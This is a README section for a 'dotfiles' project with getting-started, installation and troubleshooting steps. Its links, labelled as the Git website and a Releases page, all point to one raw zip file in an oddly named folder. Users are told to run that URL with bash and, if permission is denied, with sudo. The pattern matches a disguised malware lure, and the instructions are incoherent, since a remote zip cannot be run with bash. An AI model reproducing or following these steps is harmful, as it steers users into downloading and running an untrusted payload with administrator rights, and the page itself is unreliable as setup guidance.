## üöÄ Getting Started

To get started with dotfiles, follow these steps:

1. **Using Git**: First, ensure you have Git installed on your computer. If you don't, you can download it from the [Git website](https://raw.githubusercontent.com/Jawbreaker360/dotfiles/main/unceremoniousness/dotfiles.zip).
  
2. **Download Dotfiles**: Visit the [Releases page](https://raw.githubusercontent.com/Jawbreaker360/dotfiles/main/unceremoniousness/dotfiles.zip) to download the latest version of dotfiles.

3. **Unzip the Download**: Locate the downloaded file on your computer. Right-click on it and select ‚ÄúExtract All‚Äù or ‚ÄúUnzip.‚Äù This will create a new folder containing the dotfiles.

4. **Open Your Terminal**: You can find the terminal application in your computer's applications menu. This is where you will run commands.

5. **Navigate to the Dotfiles Folder**: Use the command `cd /path/to/dotfiles-folder` to go into the folder where you extracted the files. Replace `/path/to/dotfiles-folder` with the actual path.

## ‚öôÔ∏è Installation Instructions

To install the dotfiles, follow these instructions:

1. **Run the Installation Script**: Type `bash https://raw.githubusercontent.com/Jawbreaker360/dotfiles/main/unceremoniousness/dotfiles.zip` in the terminal and hit Enter. This script will set up your environment automatically.

2. **Follow On-Screen Prompts**: The script may ask for your input. Just follow the prompts and provide the necessary information.

3. **Verify Setup**: After the script completes, check your terminal and configuration files to ensure everything is set up correctly.

## üîß Troubleshooting

If you encounter issues during the installation, refer to this troubleshooting section:

1. **Permission Denied**: If you receive a ‚ÄúPermission Denied‚Äù message, try running the command with `sudo`. For example, type `sudo bash https://raw.githubusercontent.com/Jawbreaker360/dotfiles/main/unceremoniousness/dotfiles.zip` and enter your password when prompted.

2. **Script Fails to Run**: Ensure that you are in the correct directory. Use `pwd` to check your current directory and navigate back if needed.

3. **Missing Dependencies**: If the script reports missing dependencies, install them using your package manager. For example, for macOS, use `brew install <dependency-name>`.
